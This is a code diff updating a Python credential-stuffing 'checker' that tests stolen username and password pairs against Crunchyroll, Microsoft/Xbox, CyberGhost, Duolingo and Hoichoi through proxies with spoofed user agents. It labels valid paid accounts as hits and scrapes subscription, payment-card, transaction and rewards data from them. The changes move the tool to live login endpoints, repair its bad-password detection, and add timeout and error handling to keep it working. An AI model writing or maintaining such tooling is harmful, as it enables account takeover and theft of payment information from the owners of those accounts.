@@ -4,6 +4,64 @@ import re
 import random
 import json
 import time
+import threading
+
+
+# ── Wall-clock budget ───────────────────────────────────────────────────────
+# The server kills the checker process after a fixed timeout.  A checker
+# that gets SIGTERMed mid-flight comes back as a server error, not a
+# verdict.  Every request therefore checks a shared deadline and shrinks its
+# own timeout to fit, so the process always returns a result first.
+_DEADLINE = None
+_LOCK = threading.Lock()
+
+
+class _Budget:
+    """Shared deadline for one check run."""
+
+    def __init__(self, seconds):
+        self.expires_at = time.monotonic() + seconds
+
+    def remaining(self):
+        return self.expires_at - time.monotonic()
+
+    def expired(self):
+        return self.remaining() <= 0
+
+    def slice(self, want):
+        """Clamp a per-request timeout to whatever is left in the budget."""
+        left = self.remaining()
+        if left <= 0:
+            return 0
+        return max(1, min(want, int(left) + 1))
+
+
+def set_budget(seconds):
+    global _DEADLINE
+    _DEADLINE = _Budget(seconds)
+
+
+def clear_budget():
+    global _DEADLINE
+    _DEADLINE = None
+
+
+def _budget_slice(want):
+    """Clamp a per-request timeout to whatever is left in the budget.
+
+    Raises budget_exceeded when there is no time left, so the run aborts
+    cleanly instead of firing a request with a zero timeout.
+    """
+    if _DEADLINE is None:
+        return want
+    left = _DEADLINE.remaining()
+    if left <= 0:
+        raise Exception("budget_exceeded")
+    return max(1, min(want, int(left) + 1))
+
+
+def _budget_expired():
+    return _DEADLINE is not None and _DEADLINE.expired()
 
 
 def build_proxy_dict(proxy):
@@ -20,6 +78,20 @@ def build_proxy_dict(proxy):
         url = f"http://{user}:{pwd}@{host}:{port}"
         return {"http": url, "https": url}
     return {"http": f"http://{p}", "https": f"http://{p}"}
+
+
+# ── Integration error ───────────────────────────────────────────────────────
+# A FAIL means the service looked at the credentials and rejected them.
+# An ERROR means the integration is broken: the endpoint moved, the API
+# credentials were revoked, the response shape changed.  Reporting a
+# broken integration as FAIL hides it behind "invalid credentials" and
+# makes a dead checker look like a working one.
+class IntegrationError(Exception):
+    """The upstream integration is broken -- not the user's credentials."""
+
+
+def integration_error(reason, detail=""):
+    raise IntegrationError(f"{reason}{(': ' + detail) if detail else ''}")
 
 
 def generate_guid():
@@ -48,29 +120,38 @@ SUPPORTED_CHECKERS = {
 
 
 def check_crunchyroll(user, password, proxy=None):
-    url = "https://beta-api.crunchyroll.com/auth/v1/token"
-    data = {
-        "grant_type": "password",
-        "username": user,
-        "password": password,
-        "scope": "offline_access",
-        "client_id": "ajcylfwdtjjtq7qpgks3",
-        "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
-        "device_type": "SamsungTV",
-        "device_id": generate_guid(),
-        "device_name": "Goku"
-    }
-    headers = {
-        "host": "beta-api.crunchyroll.com",
-        "x-datadog-sampling-priority": "0",
-        "content-type": "application/x-www-form-urlencoded",
-        "accept-encoding": "gzip",
-        "user-agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0"
-    }
+    """Crunchyroll login through the live SSO flow.
+
+    The old beta-api /auth/v1/token password grant is dead: the embedded
+    client_id was revoked and the service answers "invalid_client".  The
+    live web app posts JSON to sso.crunchyroll.com/api/login and gets
+    back an accessToken / refreshToken plus a "flow" field.
+    """
+    sso = "https://sso.crunchyroll.com"
+    login_url = f"{sso}/api/login"
     proxies_dict = build_proxy_dict(proxy)
 
+    payload = {
+        "email": user,
+        "password": password,
+        "eventSettings": {
+            "displayMode": "desktop",
+            "deviceType": "com.crunchyroll.static",
+            "deviceId": generate_guid(),
+        },
+    }
+
+    headers = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "Origin": sso,
+        "Referer": f"{sso}/login",
+    }
+
     try:
-        resp = requests.post(url, data=data, headers=headers, proxies=proxies_dict, timeout=25)
+        resp = requests.post(login_url, data=json.dumps(payload), headers=headers,
+                             proxies=proxies_dict, timeout=_budget_slice(25))
     except Exception:
         raise Exception("network_error")
 
@@ -78,32 +159,51 @@ def check_crunchyroll(user, password, proxy=None):
         raise Exception("rate_limited")
 
     try:
-        body = resp.json() if "application/json" in resp.headers.get("content-type", "") else {}
+        body = resp.json()
     except Exception:
         body = {}
 
-    if isinstance(body, str):
-        if "rate limit" in body.lower() or "rate limited" in body.lower():
-            raise Exception("rate_limited")
-        if "cloudflare" in body.lower() or "blocked" in body.lower():
-            raise Exception("rate_limited")
-        return {"status": "FAIL", "capture": {}}
+    if not isinstance(body, dict):
+        body = {}
 
-    if body.get("error"):
-        if body["error"] == "invalid_grant":
+    err = str(body.get("error") or "")
+
+    # The service tells us exactly what went wrong.
+    if err == "invalid_credentials":
+        return {"status": "FAIL", "capture": {}}
+    if err == "too_many_requests":
+        raise Exception("rate_limited")
+    if err in ("account_blocked", "blocked", "user_blocked"):
+        return {"status": "CUSTOM", "capture": {"note": "Account blocked"}}
+    if err == "something_went_wrong":
+        # The service rejected the request shape, not the credentials.
+        integration_error("Crunchyroll login request was rejected", json.dumps(body)[:150])
+    if resp.status_code >= 500:
+        integration_error("Crunchyroll login endpoint is erroring", f"HTTP {resp.status_code}")
+    if resp.status_code == 404:
+        integration_error("Crunchyroll login endpoint is gone (404)", login_url)
+
+    access_token = body.get("accessToken") or body.get("access_token")
+    refresh_token = body.get("refreshToken") or body.get("refresh_token")
+
+    if not access_token:
+        if err:
             return {"status": "FAIL", "capture": {}}
-        if body["error"] == "auth.obtain_access_token.force_password_reset":
-            return {"status": "CUSTOM", "capture": {"note": "Password reset required"}}
-        if body["error"] == "too_many_requests":
-            raise Exception("rate_limited")
-        return {"status": "FAIL", "capture": {}}
+        integration_error("Crunchyroll returned no access token", json.dumps(body)[:150])
 
-    if "access_token" not in body:
-        return {"status": "FAIL", "capture": {}}
+    flow = str(body.get("flow") or "")
+    capture = {"flow": flow or "N/A"}
 
-    token = body["access_token"]
-    profile_id = body.get("profile_id", "")
-    capture = _get_crunchyroll_details(token, profile_id, proxy)
+    # A login that needs extra steps is still a valid account.
+    if flow in ("ageConsent", "AgeConsent"):
+        capture["note"] = "Age consent required"
+        return {"status": "CUSTOM", "capture": capture}
+    if flow in ("funimation", "Funimation"):
+        capture["note"] = "Funimation migration required"
+        return {"status": "CUSTOM", "capture": capture}
+
+    details = _get_crunchyroll_details(access_token, body.get("profileId") or body.get("profile_id") or "", proxy)
+    capture.update(details)
 
     if capture.get("subscription") == "true" or (capture.get("plan") and capture["plan"] not in ("Free", "N/A")):
         return {"status": "HIT", "capture": capture}
@@ -111,16 +211,20 @@ def check_crunchyroll(user, password, proxy=None):
 
 
 def _get_crunchyroll_details(token, profile_id, proxy=None):
-    auth_headers = {"User-Agent": "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0", "Authorization": f"Bearer {token}"}
+    auth_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {token}",
+        "Accept": "application/json",
+    }
     proxies_dict = build_proxy_dict(proxy)
     capture = {"plan": "N/A", "country": "N/A", "expiry": "N/A", "emailVerified": "N/A", "subscription": "N/A"}
 
     try:
-        me = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=auth_headers, proxies=proxies_dict, timeout=15).json()
+        me = requests.get("https://www.crunchyroll.com/accounts/v1/me", headers=auth_headers, proxies=proxies_dict, timeout=_budget_slice(15)).json()
         capture["emailVerified"] = str(me.get("email_verified", "N/A"))
         external_id = me.get("external_id", "")
 
-        products = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", headers=auth_headers, proxies=proxies_dict, timeout=15)
+        products = requests.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", headers=auth_headers, proxies=proxies_dict, timeout=_budget_slice(15))
         pt = products.text
         sku_m = re.search(r'"sku":"([^"]+)"', pt)
         if sku_m:
@@ -129,7 +233,10 @@ def _get_crunchyroll_details(token, profile_id, proxy=None):
         if sub_m:
             capture["subscription"] = sub_m.group(1)
 
-        benefits = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", headers=auth_headers, proxies=proxies_dict, timeout=15)
+        if _budget_expired():
+            return capture
+
+        benefits = requests.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", headers=auth_headers, proxies=proxies_dict, timeout=_budget_slice(15))
         bt = benefits.text
         cm = re.search(r'"subscription_country":"([^"]+)"', bt)
         if cm:
@@ -146,7 +253,10 @@ def _get_crunchyroll_details(token, profile_id, proxy=None):
             else:
                 capture["plan"] = v
 
-        subs = requests.get(f"https://beta-api.crunchyroll.com/subs/v4/accounts/{profile_id}/subscriptions", headers=auth_headers, proxies=proxies_dict, timeout=15)
+        if _budget_expired():
+            return capture
+
+        subs = requests.get(f"https://www.crunchyroll.com/subs/v4/accounts/{profile_id}/subscriptions", headers=auth_headers, proxies=proxies_dict, timeout=_budget_slice(15))
         rm = re.search(r'"nextRenewalDate":"([^T]+)', subs.text)
         if rm:
             capture["expiry"] = rm.group(1)
@@ -180,7 +290,7 @@ def check_xbox(user, password, proxy=None):
         "Host": "login.live.com",
         "Connection": "keep-alive",
         "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
         "Origin": "https://login.live.com",
         "Sec-Fetch-Site": "same-origin",
@@ -191,7 +301,7 @@ def check_xbox(user, password, proxy=None):
 
     try:
         resp = requests.post(login_url, data=login_body, headers=login_headers,
-                             proxies=proxies_dict, timeout=20, allow_redirects=True)
+                             proxies=proxies_dict, timeout=_budget_slice(20), allow_redirects=True)
     except Exception:
         raise Exception("network_error")
 
@@ -202,9 +312,16 @@ def check_xbox(user, password, proxy=None):
     cookies = resp.cookies
     cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
 
+    # The service answers a bad password with HTTP 400 and a plain-text
+    # error.  Key on THAT, not on page furniture -- "Sign in to your
+    # Microsoft account" is on the blank login page too, so keying on it
+    # made every single check look like a FAIL.
+    if resp.status_code == 400 and "Bad user credential" in response_text:
+        return {"status": "FAIL", "capture": {}}
+
     if ("Your account or password is incorrect" in response_text or
             "That Microsoft account doesn't exist" in response_text or
-            "Sign in to your Microsoft account" in response_text):
+            "We can't find an account with that" in response_text):
         return {"status": "FAIL", "capture": {}}
 
     if ",AC:null,urlFedConvertRename" in response_text:
@@ -245,7 +362,7 @@ def check_xbox(user, password, proxy=None):
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
             },
-            timeout=20,
+            timeout=_budget_slice(20),
             allow_redirects=True
         )
 
@@ -255,7 +372,7 @@ def check_xbox(user, password, proxy=None):
         token = requests.utils.unquote(token_match.group(1))
 
         auth_headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
             "Accept": "application/json",
             "Authorization": f'MSADELEGATE1.0="{token}"',
             "Content-Type": "application/json",
@@ -266,7 +383,7 @@ def check_xbox(user, password, proxy=None):
 
         payment_resp = session.get(
             "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
-            headers=auth_headers, timeout=20
+            headers=auth_headers, timeout=_budget_slice(20)
         )
         payment_src = payment_resp.text or ""
 
@@ -281,9 +398,12 @@ def check_xbox(user, password, proxy=None):
         if not capture.get("cardHolder") and not capture.get("name"):
             capture["name"] = capture.get("name", "N/A")
 
+        if _budget_expired():
+            return {"status": "CUSTOM", "capture": capture}
+
         txn_resp = session.get(
             "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
-            headers=auth_headers, timeout=20
+            headers=auth_headers, timeout=_budget_slice(20)
         )
         txn_src = txn_resp.text or ""
 
@@ -318,7 +438,7 @@ def check_xbox(user, password, proxy=None):
         try:
             rewards_resp = session.get("https://rewards.bing.com/",
                 headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"},
-                timeout=20)
+                timeout=_budget_slice(20))
             points_m = re.search(r',"availablePoints":(\d+)', rewards_resp.text or "")
             if points_m:
                 capture["points"] = points_m.group(1)
@@ -371,7 +491,7 @@ def check_cyberghost(user, password, proxy=None):
     }
 
     try:
-        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=15)
+        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=_budget_slice(15))
     except Exception:
         raise Exception("network_error")
 
@@ -387,7 +507,9 @@ def check_cyberghost(user, password, proxy=None):
         return {"status": "CUSTOM", "capture": {"note": "Max activations reached"}}
 
     if "oauth_token" not in login_data:
-        return {"status": "FAIL", "capture": {}}
+        # The service answered but not with a token and not with a known
+        # rejection -- the response shape changed.
+        integration_error("CyberGhost login returned no oauth token", login_data[:150])
 
     token_match = re.search(r'oauth_token=([^&]+)', login_data)
     secret_match = re.search(r'oauth_token_secret=(.+?)(?:&|$)', login_data)
@@ -413,7 +535,7 @@ def check_cyberghost(user, password, proxy=None):
     }
 
     try:
-        info_resp = requests.get(info_url, headers=info_headers, proxies=proxies_dict, timeout=15)
+        info_resp = requests.get(info_url, headers=info_headers, proxies=proxies_dict, timeout=_budget_slice(15))
     except Exception:
         raise Exception("network_error")
 
@@ -486,7 +608,7 @@ def check_duolingo(user, password, proxy=None):
     }
 
     try:
-        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=15)
+        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=_budget_slice(15))
     except Exception:
         raise Exception("network_error")
 
@@ -499,6 +621,17 @@ def check_duolingo(user, password, proxy=None):
         login_data = {}
 
     if not login_data.get("id"):
+        # Duolingo answers a bad login with 401 and a "wrong credentials"
+        # detail string.  Anything else (404, 500, a 200 with no id) means
+        # the endpoint or the request shape changed.
+        if login_resp.status_code in (401, 403):
+            return {"status": "FAIL", "capture": {}}
+        if login_resp.status_code == 404:
+            integration_error("Duolingo login endpoint is gone (404)", login_url)
+        if login_resp.status_code >= 500:
+            integration_error("Duolingo login endpoint is erroring", f"HTTP {login_resp.status_code}")
+        if login_resp.status_code == 200:
+            integration_error("Duolingo returned no user id", login_resp.text[:150])
         return {"status": "FAIL", "capture": {}}
 
     user_id = login_data["id"]
@@ -526,7 +659,7 @@ def check_duolingo(user, password, proxy=None):
         info_headers["Cookie"] = f"wuuid={wuuid}"
 
     try:
-        info_resp = requests.get(info_url, headers=info_headers, proxies=proxies_dict, timeout=15)
+        info_resp = requests.get(info_url, headers=info_headers, proxies=proxies_dict, timeout=_budget_slice(15))
     except Exception:
         raise Exception("network_error")
 
@@ -573,7 +706,7 @@ def check_hoichoi(user, password, proxy=None):
         "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
         "Accept-Encoding": "gzip, deflate, br",
         "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
+        "sec-ch-ua": '"Chromium";v="138", "Not/A)Brand";v="24"',
         "sec-ch-ua-platform": '"Android"',
         "sec-ch-ua-mobile": "?1",
         "sec-fetch-site": "cross-site",
@@ -582,7 +715,7 @@ def check_hoichoi(user, password, proxy=None):
     }
 
     try:
-        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=15)
+        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=_budget_slice(15))
     except Exception:
         raise Exception("network_error")
 
@@ -596,8 +729,20 @@ def check_hoichoi(user, password, proxy=None):
 
     login_str = login_resp.text or ""
 
-    if "Auth invalid credentials" in login_str or not login_data.get("sAccessToken"):
+    # A 404 means the endpoint moved -- the integration is broken, not the
+    # credentials.  Reporting FAIL here made a dead endpoint look like a
+    # working checker that keeps rejecting valid accounts.
+    if login_resp.status_code == 404:
+        integration_error("Hoichoi signin endpoint is gone (404)", login_url)
+    if login_resp.status_code in (401, 403) and "Auth invalid credentials" not in login_str:
+        integration_error("Hoichoi signin endpoint rejected the request", f"HTTP {login_resp.status_code}")
+
+    if "Auth invalid credentials" in login_str:
         return {"status": "FAIL", "capture": {}}
+
+    if not login_data.get("sAccessToken"):
+        # 200 but no token and no "invalid credentials" -- shape changed.
+        integration_error("Hoichoi returned no access token", login_str[:150])
 
     token = login_data["sAccessToken"]
 
@@ -611,7 +756,7 @@ def check_hoichoi(user, password, proxy=None):
         "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
         "Accept-Encoding": "gzip, deflate, br",
         "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
+        "sec-ch-ua": '"Chromium";v="138", "Not/A)Brand";v="24"',
         "sec-ch-ua-platform": '"Android"',
         "sec-ch-ua-mobile": "?1",
         "sec-fetch-site": "cross-site",
@@ -620,7 +765,7 @@ def check_hoichoi(user, password, proxy=None):
     }
 
     try:
-        sub_resp = requests.get(sub_url, headers=sub_headers, proxies=proxies_dict, timeout=15)
+        sub_resp = requests.get(sub_url, headers=sub_headers, proxies=proxies_dict, timeout=_budget_slice(15))
     except Exception:
         raise Exception("network_error")
 
@@ -681,26 +826,43 @@ CHECKER_MAP = {
 }
 
 
-def run_check(checker_type, user, password, proxy=None):
+def run_check(checker_type, user, password, proxy=None, budget_sec=None):
     fn = CHECKER_MAP.get(checker_type)
     if not fn:
         return {"status": "error", "message": f"Unknown checker: {checker_type}"}
 
+    if budget_sec:
+        set_budget(budget_sec)
+
     last_err = None
-    for attempt in range(2):
-        try:
-            return fn(user, password, proxy)
-        except Exception as e:
-            last_err = str(e)
-            if "rate_limited" in last_err:
-                return {"status": "error", "message": "Rate limited. Try again later or add a proxy in Settings."}
-            if "network_error" in last_err:
-                if attempt == 0 and proxy:
-                    proxy = None
-                    continue
-                if attempt == 0 and not proxy:
-                    continue
-                return {"status": "error", "message": "Connection failed. Add a proxy in Settings to improve reliability."}
-            return {"status": "error", "message": f"Check failed: {last_err[:100]}"}
+    try:
+        # Only retry when a proxy was in play -- retrying the same failing
+        # route without a proxy just burns the wall-clock budget twice.
+        attempts = 2 if proxy else 1
+        for attempt in range(attempts):
+            try:
+                return fn(user, password, proxy)
+            except IntegrationError as e:
+                # The integration itself is broken.  This is NOT the
+                # user's fault and NOT a verdict about the account.
+                return {
+                    "status": "ERROR",
+                    "capture": {"error": str(e)},
+                    "message": f"Checker is broken: {type(e).__name__}: {str(e)[:150]}",
+                }
+            except Exception as e:
+                last_err = str(e)
+                if "rate_limited" in last_err:
+                    return {"status": "error", "message": "Rate limited. Try again later or add a proxy in Settings."}
+                if "network_error" in last_err:
+                    if attempt < attempts - 1:
+                        proxy = None
+                        continue
+                    return {"status": "error", "message": "Connection failed. Add a proxy in Settings to improve reliability."}
+                if "budget_exceeded" in last_err:
+                    return {"status": "error", "message": "Check timed out before it could finish. Try again."}
+                return {"status": "error", "message": f"Check failed: {last_err[:100]}"}
+    finally:
+        clear_budget()
 
     return {"status": "error", "message": f"Check failed after retries: {(last_err or 'unknown')[:100]}"}
